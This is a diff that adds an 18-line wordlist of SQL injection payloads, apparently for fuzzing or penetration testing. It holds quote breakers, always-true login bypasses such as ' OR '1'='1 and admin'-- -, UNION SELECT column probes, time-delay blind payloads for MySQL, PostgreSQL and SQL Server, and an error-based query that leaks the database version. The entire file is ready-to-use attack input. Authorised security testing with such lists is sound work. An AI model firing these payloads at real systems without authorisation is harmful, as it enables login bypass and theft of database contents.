@@ -1,0 +1,18 @@
+'
+"
+')
+"))
+' OR '1'='1
+" OR "1"="1
+' OR 1=1-- -
+admin'-- -
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+1' AND SLEEP(5)-- -
+1") AND SLEEP(5)-- -
+1' AND (SELECT 1 FROM PG_SLEEP(5))-- -
+1' AND IF(1=1,SLEEP(5),0)-- -
+1; WAITFOR DELAY '0:0:5'-- -
+1' AND extractvalue(1,concat(0x7e,version()))-- -
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
